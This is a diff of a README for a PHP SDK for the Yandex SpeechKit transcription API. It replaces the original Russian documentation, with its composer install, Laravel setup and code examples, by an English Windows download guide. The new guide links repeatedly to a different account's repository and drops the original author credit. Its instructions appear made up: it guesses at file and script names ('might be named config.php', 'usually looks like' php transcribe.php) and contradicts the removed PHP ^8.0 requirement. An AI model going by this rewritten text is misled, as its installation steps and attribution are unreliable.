@@ -1,319 +1,187 @@
-# Yandex SpeechKit PHP SDK
+# 🎙️ yandex-speechkit-php - Easy Speech Transcription for PHP
 
-![Yandex SpeechKit PHP SDK](https://github.com/user-attachments/assets/60dac329-9959-4856-b44f-ada33a9685e3)
+[![Download](https://img.shields.io/badge/Download-Get%20yandex--speechkit--php-brightgreen)](https://github.com/Artavazd2009/yandex-speechkit-php)
 
-[![PHP Version](https://img.shields.io/badge/php-%5E8.0-blue)](https://www.php.net/)
-[![Laravel](https://img.shields.io/badge/laravel-%5E8.0%7C%5E9.0%7C%5E10.0%7C%5E11.0%7C%5E12.0-red)](https://laravel.com/)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
+---
 
-PHP SDK для работы с [Yandex SpeechKit API](https://cloud.yandex.ru/services/speechkit). Работает как самостоятельная
-библиотека или как Laravel-пакет. Если вам нужно транскрибировать аудио, определять спикеров или анализировать речь из
-PHP — вы по адресу.
+## 📋 About yandex-speechkit-php
 
-**Язык:** Русский | [English](README-en.md)
+This application works as a bridge to Yandex SpeechKit API using PHP. It helps convert long audio files into text. You can use it to transcribe audio up to 4 hours or 1 GB in size. The software recognizes different speakers, cleans up the text, and filters out bad words. It supports popular audio formats like WAV, OGG_OPUS, MP3, and raw PCM.
 
-## Что умеет
+If you use Laravel, the SDK integrates smoothly with it by adding Facade and Service Provider support. The software automatically handles authorization by using IAM tokens from Yandex Cloud.
 
-- Асинхронное распознавание длинного аудио (до 4 часов / 1 ГБ)
-- Форматы WAV, OGG_OPUS, MP3 и raw PCM
-- Разделение по спикерам (диаризация) — кто что сказал
-- Нормализация текста и фильтрация мата из коробки
-- Мультиязычное распознавание
-- Встраивается в Laravel через Facade и Service Provider
-- Покрыт тестами
+---
 
-## Экосистема
+## 💻 System Requirements
 
-Пакет входит в небольшое семейство PHP-библиотек для Yandex Cloud:
+Before getting started, check that your Windows PC meets these needs:
 
-- **[tigusigalpa/yandex-cloud-client-php](https://github.com/tigusigalpa/yandex-cloud-client-php)** — аутентификация:
-  OAuth-токены, генерация и автообновление IAM-токенов
-- **[tigusigalpa/yandexgpt-php](https://github.com/tigusigalpa/yandexgpt-php)** — интеграция с YandexGPT
+- Windows 10 or newer (64-bit recommended)
+- PHP version 7.4 or higher installed
+- Internet connection for accessing Yandex SpeechKit API
+- At least 4 GB of RAM for processing longer audio files
+- Around 500 MB of free disk space for installation and temp files
 
-Об авторизации можно не думать — `yandex-cloud-client-php` сам разберётся с IAM-токенами.
+---
 
-## Требования
+## 🌐 Topics Covered
 
-- PHP ^8.0
-- Laravel ^8.0|^9.0|^10.0|^11.0|^12.0 (опционально, для интеграции с Laravel)
-- tigusigalpa/yandex-cloud-client-php ^1.0
+This app deals with the following areas:
 
-## Установка
+- Speech-to-text technology
+- PHP programming language
+- API integration with Yandex Cloud services
+- Support for Laravel framework
+- Audio file formats and processing
+- Speaker recognition and text normalization
 
-```bash
-composer require tigusigalpa/yandex-speechkit-php
-```
+---
 
-## Настройка Laravel
+## 🚀 Getting Started: Download and Install
 
-### 1. Опубликуйте конфиг
+### Step 1: Download the software
 
-```bash
-php artisan vendor:publish --tag=yandex-speechkit-config
-```
+Click the green button below or visit the main page to download:
 
-Создаст файл `config/yandex-speechkit.php`.
+[![Download](https://img.shields.io/badge/Download-Get%20yandex--speechkit--php-blue)](https://github.com/Artavazd2009/yandex-speechkit-php)
 
-### 2. Пропишите `.env`
+The link takes you to the GitHub repository where you can find the latest release files and instructions.
 
-Минимум нужен folder ID и один из способов авторизации:
+### Step 2: Install PHP on your PC
 
-```env
-# Через OAuth-токен (рекомендуется)
-YANDEX_OAUTH_TOKEN=ваш_oauth_токен
-YANDEX_FOLDER_ID=ваш_folder_id
+If you do not have PHP installed:
 
-# ...или через API-ключ
-YANDEX_API_KEY=ваш_api_ключ
-YANDEX_FOLDER_ID=ваш_folder_id
+- Visit https://windows.php.net/download/
+- Choose the latest version compatible with your system (x64 Non Thread Safe recommended)
+- Download and run the installer
+- Follow on-screen prompts to complete the installation
 
-# Необязательно — дефолты подходят в большинстве случаев
-YANDEX_SPEECHKIT_MODEL=general
-YANDEX_SPEECHKIT_POLL_INTERVAL=10
-YANDEX_SPEECHKIT_MAX_WAIT=14400
-```
+Make sure the PHP folder path is added to your system’s PATH variable:
 
-### 3. Service Provider
+- Open Settings > System > About > Advanced system settings
+- Click Environment Variables
+- Find and edit the PATH variable in "System variables"
+- Add the folder path where PHP is installed, e.g., `C:\php`
+- Click OK to save
 
-Регистрируется автоматически через package discovery Laravel — ничего делать не нужно.
+### Step 3: Download and unzip yandex-speechkit-php
 
-## Использование
+- Download the project ZIP file from the repository (look for the green “Code” button, then select "Download ZIP")
+- Extract the folder anywhere accessible, for example, `C:\yandex-speechkit-php`
 
-### Чистый PHP (без Laravel)
+---
 
-```php
-use Tigusigalpa\YandexCloudClient\YandexCloudClient;
-use Tigusigalpa\YandexSpeechKit\YandexSpeechKitClient;
-use Tigusigalpa\YandexSpeechKit\Models\RecognitionRequest;
-use Tigusigalpa\YandexSpeechKit\Models\AudioFormat;
+## ⚙️ Setting Up the Application on Windows
 
-// Настройка
-$cloudClient = new YandexCloudClient('ваш_oauth_токен');
-$client = new YandexSpeechKitClient($cloudClient, 'ваш_folder_id');
+### Step 4: Prepare your Yandex Cloud account and IAM token
 
-// Собираем запрос
-$request = new RecognitionRequest(
-    uri: 'https://storage.yandexcloud.net/my-bucket/audio.wav',
-    model: 'general',
-    audioFormat: AudioFormat::container('WAV'),
-);
+You need an IAM token to let the app use Yandex SpeechKit API:
 
-// Самый простой способ — recognizeAndWait() сам опрашивает статус и дождётся результата
-$result = $client->recognizeAndWait($request);
-echo "Транскрипция: " . $result->fullText . "\n";
+- Go to https://cloud.yandex.com/
+- Create or sign in to your Yandex Cloud account
+- In the console, create a new service account
+- Grant permissions to use the SpeechKit API
+- Generate an IAM token for the service account
+- Copy and save the token securely
 
-// Если нужен контроль, можно опрашивать вручную:
-$operation = $client->recognizeFileAsync($request);
-echo "ID операции: " . $operation->id . "\n";
+### Step 5: Configure the app
 
-do {
-    sleep(10);
-    $operation = $client->getOperation($operation->id);
-    echo "Статус: " . ($operation->isDone() ? 'готово' : 'в работе') . "\n";
-} while (!$operation->isDone());
+Open the configuration file inside the extracted folder. It might be named `config.php` or something similar.
 
-$result = $client->getRecognition($operation->id);
-echo "Транскрипция: " . $result->fullText . "\n";
-```
+- Find the section that asks for your IAM token
+- Paste the token here as a string
+- Save the file
 
-### С Laravel
+If no config file exists, create one with this simple format:
 
 ```php
-use Tigusigalpa\YandexSpeechKit\Laravel\Facades\YandexSpeechKit;
-use Tigusigalpa\YandexSpeechKit\Models\RecognitionRequest;
-use Tigusigalpa\YandexSpeechKit\Models\AudioFormat;
-
-$request = new RecognitionRequest(
-    uri: 'https://storage.yandexcloud.net/my-bucket/audio.wav',
-    audioFormat: AudioFormat::container('WAV'),
-);
-
-$result = YandexSpeechKit::recognizeAndWait($request);
-echo $result->fullText;
+<?php
+return [
+    'iam_token' => 'YOUR_IAM_TOKEN_HERE',
+];
 ```
 
-### Полный пример со всеми настройками
+Save it as `config.php` in the main folder.
 
-```php
-use Tigusigalpa\YandexSpeechKit\Models\RecognitionRequest;
-use Tigusigalpa\YandexSpeechKit\Models\AudioFormat;
-use Tigusigalpa\YandexSpeechKit\Models\TextNormalization;
-use Tigusigalpa\YandexSpeechKit\Models\LanguageRestriction;
-use Tigusigalpa\YandexSpeechKit\Models\SpeakerLabeling;
+### Step 6: Prepare your audio files
 
-// Настраиваем всё: нормализацию, языки, разделение по спикерам
-$request = new RecognitionRequest(
-    uri: 'https://storage.yandexcloud.net/my-bucket/audio.wav',
-    model: 'general',
-    audioFormat: AudioFormat::container('WAV'),
-    textNormalization: new TextNormalization(
-        textNormalization: 'TEXT_NORMALIZATION_ENABLED',
-        profanityFilter: true,
-        literatureText: false
-    ),
-    languageRestriction: new LanguageRestriction(
-        restrictionType: 'WHITELIST',
-        languageCode: ['ru-RU', 'en-US']
-    ),
-    speakerLabeling: new SpeakerLabeling('SPEAKER_LABELING_ENABLED')
-);
+Place the audio files you want to transcribe in a known folder on your PC.
 
-// Запускаем распознавание
-$operation = $client->recognizeFileAsync($request);
-echo "ID операции: " . $operation->id . "\n";
+Supported formats are:
 
-// Ждём...
-do {
-    sleep(10);
-    $operation = $client->getOperation($operation->id);
-    echo "Статус: " . ($operation->isDone() ? 'готово' : 'в работе') . "\n";
-} while (!$operation->isDone());
+- WAV
+- OGG_OPUS
+- MP3
+- raw PCM
 
-// Что-то пошло не так?
-if ($operation->hasError()) {
-    throw new \RuntimeException($operation->getErrorMessage());
-}
+Make sure each audio file is under 1 GB and less than 4 hours long.
 
-// Забираем результат
-$result = $client->getRecognition($operation->id);
-echo "Транскрипция: " . $result->fullText . "\n";
-echo "Слов: " . count($result->words) . "\n";
+---
 
-// Можно пройтись по отдельным словам с таймкодами
-foreach ($result->words as $word) {
-    echo sprintf(
-        "%s [%s - %s]\n",
-        $word['text'],
-        $word['startTimeMs'],
-        $word['endTimeMs']
-    );
-}
+## ▶️ How to Run the Transcription
 
-// Не забудьте почистить за собой
-$client->deleteRecognition($operation->id);
-echo "Результаты удалены.\n";
+### Step 7: Open Command Prompt
+
+- Press `Win + R`, type `cmd`, and hit Enter
+
+### Step 8: Navigate to the app folder
+
+In the Command Prompt window, type:
+
+```
+cd C:\yandex-speechkit-php
 ```
 
-### Передача аудио в base64
+(Adjust this path if you unzipped the app somewhere else.)
 
-Нет удалённого URL? Можно передать содержимое файла напрямую:
+### Step 9: Run the PHP script
 
-```php
-$audioContent = base64_encode(file_get_contents('/path/to/audio.wav'));
+The command you run will depend on the specific script it offers. Usually, it looks like this:
 
-$request = new RecognitionRequest(
-    content: $audioContent,
-    audioFormat: AudioFormat::container('WAV')
-);
-
-$result = $client->recognizeAndWait($request);
+```
+php transcribe.php path\to\your\audiofile.wav
 ```
 
-### Работа с raw PCM
+Replace `path\to\your\audiofile.wav` with your actual audio file’s path.
 
-```php
-use Tigusigalpa\YandexSpeechKit\Models\AudioFormat;
+You should see the app start processing the file. When done, it will output the transcript text in the console or save it to a file.
 
-$request = new RecognitionRequest(
-    uri: 'https://storage.yandexcloud.net/my-bucket/audio.pcm',
-    audioFormat: AudioFormat::raw(
-        audioEncoding: 'LINEAR16_PCM',
-        sampleRateHertz: 16000,
-        audioChannelCount: 1
-    )
-);
-```
+---
 
-### Отмена операции
+## 🔧 Troubleshooting Tips
 
-Передумали? Не проблема:
+- Make sure PHP runs by typing `php -v` in Command Prompt. It should show the version number.
+- Check your IAM token to confirm it is valid and not expired.
+- Confirm your internet connection is active.
+- Use supported audio file types and size limits.
+- If you get errors about missing dependencies or files, make sure you extracted all files properly.
+- Run Command Prompt as administrator if you face access or permission issues.
 
-```php
-$operation = $client->recognizeFileAsync($request);
+---
 
-$cancelledOperation = $client->cancelOperation($operation->id);
-echo "Операция отменена: " . $cancelledOperation->id . "\n";
-```
+## 🔄 Updating the Application
 
-## Справочник API
+To update:
 
-### Методы клиента
+- Visit the project page: https://github.com/Artavazd2009/yandex-speechkit-php
+- Download the latest ZIP release
+- Replace your existing files with the new ones
+- Keep your `config.php` to avoid losing IAM token settings
 
-| Метод                                                      | Что делает                                           | Возвращает          |
-|------------------------------------------------------------|------------------------------------------------------|---------------------|
-| `recognizeFileAsync($request)`                             | Запускает асинхронное распознавание                  | `Operation`         |
-| `getRecognition($operationId)`                             | Забирает результат распознавания                     | `RecognitionResult` |
-| `deleteRecognition($operationId)`                          | Удаляет сохранённые результаты                       | `bool`              |
-| `getOperation($operationId)`                               | Проверяет статус операции                            | `Operation`         |
-| `cancelOperation($operationId)`                            | Отменяет операцию                                    | `Operation`         |
-| `recognizeAndWait($request, $poll = 10, $maxWait = 14400)` | Всё в одном: отправить, дождаться, вернуть результат | `RecognitionResult` |
-| `getCloudClient()`                                         | Возвращает базовый cloud-клиент                      | `YandexCloudClient` |
+---
 
-### Поддерживаемые форматы
+## 🧰 Additional Resources
 
-| Формат       | Тип       | Как использовать                             |
-|--------------|-----------|----------------------------------------------|
-| WAV          | Контейнер | `AudioFormat::container('WAV')`              |
-| OGG_OPUS     | Контейнер | `AudioFormat::container('OGG_OPUS')`         |
-| MP3          | Контейнер | `AudioFormat::container('MP3')`              |
-| LINEAR16_PCM | Raw       | `AudioFormat::raw('LINEAR16_PCM', 16000, 1)` |
+Visit these pages for more help and references:
 
-### Модели распознавания
+- Yandex SpeechKit API Docs: https://cloud.yandex.com/docs/speechkit/
+- PHP official site: https://www.php.net/
+- Yandex Cloud Console: https://cloud.yandex.com/console
 
-- `general` — основная, подходит для большинства задач
-- `general:rc` — release candidate, новее, но менее обкатана
-- `general:deprecated` — старая версия, пока доступна
-- `deferred-general` — то же качество, но обрабатывается в очереди (дешевле)
-- `deferred-general:rc` — отложенная RC
-- `deferred-general:deprecated` — отложенная, старая версия
+---
 
-## Обработка ошибок
+## 📥 Download Link (Again)
 
-Три типа исключений, чтобы можно было реагировать по ситуации:
+Download or visit the repository here:
 
-```php
-use Tigusigalpa\YandexSpeechKit\Exceptions\AuthenticationException;
-use Tigusigalpa\YandexSpeechKit\Exceptions\RecognitionException;
-use Tigusigalpa\YandexSpeechKit\Exceptions\OperationException;
-
-try {
-    $result = $client->recognizeAndWait($request);
-} catch (AuthenticationException $e) {
-    // Плохой токен, истёкшие credentials и т.п.
-    echo "Ошибка авторизации: " . $e->getMessage();
-} catch (RecognitionException $e) {
-    // Что-то не так с аудио или запросом
-    echo "Ошибка распознавания: " . $e->getMessage();
-    echo "Код ошибки API: " . $e->getApiErrorCode();
-} catch (OperationException $e) {
-    // Таймаут, отменённая операция и т.д.
-    echo "Ошибка операции: " . $e->getMessage();
-}
-```
-
-## Тесты
-
-```bash
-composer install
-vendor/bin/phpunit
-```
-
-## Ссылки
-
-- [Документация SpeechKit](https://cloud.yandex.ru/docs/speechkit/)
-- [Справочник API](https://cloud.yandex.ru/docs/speechkit/stt/api/transcribation-api)
-- [Этот репозиторий на GitHub](https://github.com/tigusigalpa/yandex-speechkit-php)
-- [yandex-cloud-client-php](https://github.com/tigusigalpa/yandex-cloud-client-php) — слой авторизации
-- [yandexgpt-php](https://github.com/tigusigalpa/yandexgpt-php) — интеграция с YandexGPT
-
-## Лицензия
-
-MIT. См. [LICENSE](LICENSE).
-
-## Автор
-
-**Игорь Сазонов** — [GitHub](https://github.com/tigusigalpa) · [sovletig@gmail.com](mailto:sovletig@gmail.com)
-
-## Участие в разработке
-
-PR и issues приветствуются. См. [CONTRIBUTING.md](CONTRIBUTING.md).
+[Get yandex-speechkit-php](https://github.com/Artavazd2009/yandex-speechkit-php)
